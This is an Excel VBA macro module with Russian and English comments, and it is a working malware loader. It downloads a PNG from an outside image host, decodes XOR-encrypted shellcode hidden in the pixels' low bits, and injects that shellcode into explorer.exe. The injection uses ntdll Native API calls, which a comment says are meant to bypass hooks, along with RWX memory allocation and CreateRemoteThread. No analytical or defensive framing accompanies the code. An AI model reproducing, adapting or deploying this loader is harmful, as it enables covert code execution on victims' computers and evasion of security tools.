Option Explicit

' Импорт Native API для максимального обхода хуков
Private Declare PtrSafe Function NtOpenProcess Lib "ntdll.dll" (ByRef ProcessHandle As LongPtr, ByVal DesiredAccess As Long, ByRef ObjectAttributes As Any, ByRef ClientId As Any) As Long
#If VBA7 Then
    ' 64-bit declaration for Windows 11
    Private Declare PtrSafe Function NtAllocateVirtualMemory Lib "ntdll.dll" ( _
        ByVal ProcessHandle As LongPtr, _
        ByRef BaseAddress As LongPtr, _
        ByVal ZeroBits As LongPtr, _
        ByRef regionSize As LongPtr, _
        ByVal AllocationType As Long, _
        ByVal Protect As Long) As Long
#Else
    ' 32-bit legacy declaration
    Private Declare Function NtAllocateVirtualMemory Lib "ntdll.dll" ( _
        ByVal ProcessHandle As Long, _
        ByRef BaseAddress As Long, _
        ByVal ZeroBits As Long, _
        ByRef RegionSize As Long, _
        ByVal AllocationType As Long, _
        ByVal Protect As Long) As Long
#End If
#If VBA7 Then
    Private Declare PtrSafe Function NtWriteVirtualMemory Lib "ntdll.dll" ( _
        ByVal ProcessHandle As LongPtr, _
        ByVal BaseAddress As LongPtr, _
        ByVal Buffer As LongPtr, _
        ByVal NumberOfBytesToWrite As LongPtr, _
        ByRef NumberOfBytesWritten As LongPtr) As Long
#Else
    Private Declare Function NtWriteVirtualMemory Lib "ntdll.dll" ( _
        ByVal ProcessHandle As Long, _
        ByVal BaseAddress As Long, _
        ByVal Buffer As Long, _
        ByVal NumberOfBytesToWrite As Long, _
        ByRef NumberOfBytesWritten As Long) As Long
#End If
Private Declare PtrSafe Function NtQueueApcThread Lib "ntdll.dll" (ByVal ThreadHandle As LongPtr, ByVal ApcRoutine As LongPtr, ByVal ApcContext As LongPtr, ByVal ApcReserved1 As LongPtr, ByVal ApcReserved2 As LongPtr) As Long
Private Declare PtrSafe Function NtClose Lib "ntdll.dll" (ByVal Handle As LongPtr) As Long
Private Declare PtrSafe Function CreateRemoteThread Lib "kernel32" (ByVal hProcess As LongPtr, ByVal lpThreadAttributes As LongPtr, ByVal dwStackSize As LongPtr, ByVal lpStartAddress As LongPtr, ByVal lpParameter As LongPtr, ByVal dwCreationFlags As Long, lpThreadId As Long) As LongPtr

' Вспомогательные функции для поиска процесса
Private Declare PtrSafe Function CreateToolhelp32Snapshot Lib "kernel32" (ByVal dwFlags As Long, ByVal th32ProcessID As Long) As LongPtr
Private Declare PtrSafe Function Process32First Lib "kernel32" (ByVal hSnapshot As LongPtr, lppe As Any) As Long
Private Declare PtrSafe Function Process32Next Lib "kernel32" (ByVal hSnapshot As LongPtr, lppe As Any) As Long
Private Declare PtrSafe Function Thread32First Lib "kernel32" (ByVal hSnapshot As LongPtr, lpte As Any) As Long
Private Declare PtrSafe Function Thread32Next Lib "kernel32" (ByVal hSnapshot As LongPtr, lpte As Any) As Long
Private Declare PtrSafe Function OpenThread Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwThreadId As Long) As LongPtr

' Структуры и константы
Private Type PROCESSENTRY32: dwSize As Long: cntUsage As Long: th32ProcessID As Long: th32DefaultHeapID As LongPtr: th32ModuleID As Long: cntThreads As Long: th32ParentProcessID As Long: pcPriClassBase As Long: dwFlags As Long: szExeFile As String * 260: End Type
Private Type THREADENTRY32: dwSize As Long: cntUsage As Long: th32ThreadID As Long: th32OwnerProcessID As Long: tpBasePri As Long: tpDeltaPri As Long: dwFlags As Long: End Type
Private Type CLIENT_ID: UniqueProcess As LongPtr: UniqueThread As LongPtr: End Type
Type OBJECT_ATTRIBUTES
    Length As Long
    RootDirectory As LongPtr
    ObjectName As LongPtr
    Attributes As Long
    SecurityDescriptor As LongPtr
    SecurityQualityOfService As LongPtr
    End Type
    
Private Const PROCESS_ALL_ACCESS = &H1F0FFF
Private Const THREAD_SET_CONTEXT = &H10
Private Const MEM_COMMIT = &H1000: Private Const MEM_RESERVE = &H2000
Private Const PAGE_EXECUTE_READWRITE = &H40

' Function to download the file from the internet to a local path
Function DownloadFile(URL As String, LocalPath As String) As Boolean
    Dim WinHttpReq As Object
    On Error Resume Next
    
    ' Initialize XMLHTTP object
    Set WinHttpReq = CreateObject("Microsoft.XMLHTTP")
    WinHttpReq.Open "GET", URL, False
    WinHttpReq.Send
    
    ' Check if request was successful
    If WinHttpReq.status = 200 Then
        Dim oStream As Object
        Set oStream = CreateObject("ADODB.Stream")
        oStream.Open
        oStream.Type = 1 ' adTypeBinary
        oStream.Write WinHttpReq.ResponseBody
        oStream.SaveToFile LocalPath, 2 ' adSaveCreateOverWrite
        oStream.Close
        DownloadFile = True
    Else
        DownloadFile = False
    End If
End Function

' Main extraction procedure
Function DownloadAndExtract() As Byte()

    Dim imgURL As String
    Dim tempPath As String
    Dim xorKey As Byte
    Dim offsetPixels As Long
    
    ' --- CONFIGURATION ---
    ' Make sure these match your Python script settings
    imgURL = "https://i.postimg.cc/c0Bm49MN/o.png?dl=1" ' Direct link to your PNG
    tempPath = Environ("TEMP") & "\downloaded_payload.png"
    xorKey = &H77
    offsetPixels = 20
    ' ---------------------
    
    ' 1. Download the image
    If Not DownloadFile(imgURL, tempPath) Then
        MsgBox "Error: Could not download file from the provided URL!", vbCritical
        Exit Function
    End If
    
    Dim img As Object, px As Object
    Set img = CreateObject("WIA.ImageFile")
    img.LoadFile tempPath
    Set px = img.ARGBData
    
    Dim bitBuffer As Long, bitCount As Integer, byteCount As Long
    Dim totalTargetBytes As Long: totalTargetBytes = 4 ' Сначала ищем длину
    Dim shellcode() As Byte: ReDim shellcode(3)
    Dim lengthFound As Boolean: lengthFound = False
    
    Dim i As Long, c As Integer, pixelVal As Long, rgb(2) As Byte
    
    ' Основной цикл по пикселям после отступа
    For i = offsetPixels + 1 To px.Count
    pixelVal = px.Item(i)
    
    ' Извлекаем байты без ошибок переполнения
    ' Используем маски, чтобы получить чистые значения 0-255
    rgb(0) = CByte(((pixelVal And &HFF0000) \ &H10000) And &HFF)
    rgb(1) = CByte(((pixelVal And &HFF00) \ &H100) And &HFF)
    rgb(2) = CByte(pixelVal And &HFF)
    
    ' ВНИМАНИЕ: Python PIL (RGB) -> VBA WIA (ARGB)
    ' Если данные не читаются, попробуйте поменять цикл на: For c = 2 To 0 Step -1
    For c = 0 To 2
        If (rgb(c) And 1) = 1 Then
            bitBuffer = bitBuffer Or (2 ^ bitCount)
        End If
        bitCount = bitCount + 1
        
        If bitCount = 8 Then
            ' Расшифровываем байт
            Dim decodedByte As Byte
            decodedByte = CByte(bitBuffer Xor xorKey)
            
            ' Сохраняем в массив
            shellcode(byteCount) = decodedByte
            byteCount = byteCount + 1
            
            ' Сбрасываем буфер
            bitBuffer = 0
            bitCount = 0
            
            ' Проверка длины после первых 4 байт
            If byteCount = 4 And lengthFound = False Then
                totalTargetBytes = CLng(CDbl(shellcode(0)) + _
                                        CDbl(shellcode(1)) * 256# + _
                                        CDbl(shellcode(2)) * 65536# + _
                                        CDbl(shellcode(3)) * 16777216#)
                
                If totalTargetBytes > 0 And totalTargetBytes < 1000000 Then
                    ReDim Preserve shellcode(totalTargetBytes + 3)
                    lengthFound = True
                Else
                    MsgBox "Ошибка: Неверная длина (" & totalTargetBytes & ")", vbCritical
                    Exit Function
                End If
            End If
            
            ' Если вытащили всё
            If lengthFound And byteCount = totalTargetBytes + 4 Then GoTo SuccessDownloadAndExtract
        End If
    Next c
Next i
    
SuccessDownloadAndExtract:

    Dim cleanData() As Byte
    ReDim cleanData(totalTargetBytes - 1)
        
    Dim k As Long
    For k = 0 To totalTargetBytes - 1
        cleanData(k) = shellcode(k + 4)
    Next k
        
    Kill tempPath
    
    DownloadAndExtract = cleanData
    
End Function

Function GetPID(name As String) As Long
    Dim hSnap As LongPtr, pe As PROCESSENTRY32
    hSnap = CreateToolhelp32Snapshot(&H2, 0): pe.dwSize = Len(pe)
    If Process32First(hSnap, pe) Then
        Do
            If InStr(LCase(pe.szExeFile), LCase(name)) > 0 Then GetPID = pe.th32ProcessID: Exit Do
        Loop While Process32Next(hSnap, pe)
    End If
    NtClose hSnap
End Function

Function GetPIDD(ByVal processName As String) As Long
    Dim objWMIService As Object
    Dim colProcessList As Object
    Dim objProcess As Object
    
    ' Set default return value to 0 (not found)
    GetPIDD = 0
    
    ' Connect to WMI
    Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
    
    ' Query for processes matching the name
    Set colProcessList = objWMIService.ExecQuery _
        ("Select * from Win32_Process Where Name = '" & processName & "'")
    
    ' Loop through matches (returns the first one found)
    For Each objProcess In colProcessList
        GetPIDD = objProcess.ProcessId
        Exit For
    Next objProcess
    
    ' Clean up
    Set colProcessList = Nothing
    Set objWMIService = Nothing
End Function

Function GetFirstThreadID(pid As Long) As Long
    Dim hSnap As LongPtr, te As THREADENTRY32
    hSnap = CreateToolhelp32Snapshot(&H4, 0): te.dwSize = Len(te)
    If Thread32First(hSnap, te) Then
        Do
            If te.th32OwnerProcessID = pid Then GetFirstThreadID = te.th32ThreadID: Exit Do
        Loop While Thread32Next(hSnap, te)
    End If
    NtClose hSnap
End Function

Sub Init()
    Dim finalPayload() As Byte
    finalPayload = DownloadAndExtract()
    
    ' Visual test part
    Dim finalResultString As String
    Dim finalResultHex As String
    Dim k As Long
    
    For k = 0 To UBound(finalPayload)
        finalResultString = finalResultString & Chr(finalPayload(k))
        finalResultHex = finalResultHex & Right("0" & Hex(finalPayload(k)), 2) & " "
    Next k
    
    With Sheets(1)
        .Range("A1").Value = finalResultString
        .Range("A2").Value = finalResultHex
        .Columns("A").AutoFit
        
    End With
    ' Visual test part
    
    Dim targetPID As Long, targetTID As Long
    Dim hProcess As LongPtr, hThread As LongPtr
    Dim regionSize As LongPtr
    Dim lpBaseAddress As LongPtr
    Dim ZeroBits As LongPtr
    Dim cid As CLIENT_ID
    
' Inside your sub:
    Dim oa As OBJECT_ATTRIBUTES
    oa.Length = LenB(oa) ' This is the critical part
    
    ' 1. Поиск explorer.exe и его первого потока
    targetPID = GetPIDD("explorer.exe")
    targetTID = GetFirstThreadID(targetPID)
    If targetPID = 0 Or targetTID = 0 Then Exit Sub

    Dim status As Long
    ' 2. Открытие процесса через Native API
    cid.UniqueProcess = targetPID
    cid.UniqueThread = targetTID

' Use the properly initialized oa structure
    status = NtOpenProcess(hProcess, PROCESS_ALL_ACCESS, oa, cid)
    If status <> 0 Then
        Debug.Print "NtOpenProcess failed: 0x" & Hex(status)
        Exit Sub
    End If


    
    ' Constants
    Const MEM_COMMIT As Long = &H1000
    Const MEM_RESERVE As Long = &H2000
    Const PAGE_EXECUTE_READWRITE As Long = &H40
    
    lpBaseAddress = 0        ' Let OS decide address
    Dim payloadSize As LongPtr

    payloadSize = UBound(finalPayload) - LBound(finalPayload) + 1
    regionSize = payloadSize
    
    status = NtAllocateVirtualMemory(hProcess, lpBaseAddress, 0, regionSize, _
                                     MEM_COMMIT Or MEM_RESERVE, _
                                     PAGE_EXECUTE_READWRITE)
    
    If status = 0 Then
        Debug.Print "Success! Memory allocated at: 0x" & Hex(lpBaseAddress)
        Debug.Print "Actual Region Size: " & regionSize
    Else
        Debug.Print "Failed with NTSTATUS: 0x" & Hex(status)
    End If



    Dim bytesWritten As LongPtr
    

    ' The Fix: Pass bytesWritten ByRef instead of a literal 0
    status = NtWriteVirtualMemory(hProcess, _
                              lpBaseAddress, _
                              VarPtr(finalPayload(LBound(finalPayload))), _
                              payloadSize, _
                              bytesWritten)

If status = 0 Then
    Debug.Print "Write Successful. Bytes written: " & bytesWritten
Else
    ' Common error: &HC0000005 (STATUS_ACCESS_VIOLATION) if memory isn't writable
    Debug.Print "Write Failed. NTSTATUS: 0x" & Hex(status)
End If



    Dim hRemoteThread As LongPtr
    Dim threadId As Long

    hRemoteThread = CreateRemoteThread(hProcess, 0, 0, lpBaseAddress, 0, 0, threadId)

    If hRemoteThread <> 0 Then
        ' Success: The shellcode is now running in its own thread
        NtClose hRemoteThread
    Else
        ' Handle failure (e.g., Access Denied)
        Debug.Print "Failed to create remote thread. Error: " & Err.LastDllError
    End If

    ' 6. Cleanup
    NtClose hProcess
    
End Sub







